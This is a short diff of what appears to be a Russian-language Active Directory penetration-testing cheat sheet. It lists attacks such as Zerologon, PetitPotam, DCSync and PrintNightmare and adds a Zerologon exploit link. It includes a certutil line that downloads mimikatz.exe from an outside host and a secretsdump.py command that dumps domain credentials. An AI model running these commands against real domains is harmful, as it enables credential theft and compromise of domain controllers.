@@ -282,8 +282,11 @@ certutil -urlcache -split -f http://10.10.14.16/mimikatz.exe C:\Windows\System32
 - Поиск серверов с уязвимостью
 - Поиск секретов Wiki, confluence, jira
 - Petitpotam
-- Zerologon (Приводит к установке пустого пароля машинного аккаунта контроллера домена, что может повлечь нарушение работы домена в целом.)
+- Zerologon (Приводит к установке пустого пароля машинного аккаунта контроллера домена, что может повлечь нарушение работы домена в целом. https://github.com/VoidSec/CVE-2020-1472)
 - DCSync (python3 secretsdump.py test.local/john:password123@10.10.10.1)
+- SamAccountNameSpoofing
+- PrinterNightmare
+
 
 
 **Поиск Gpp** 
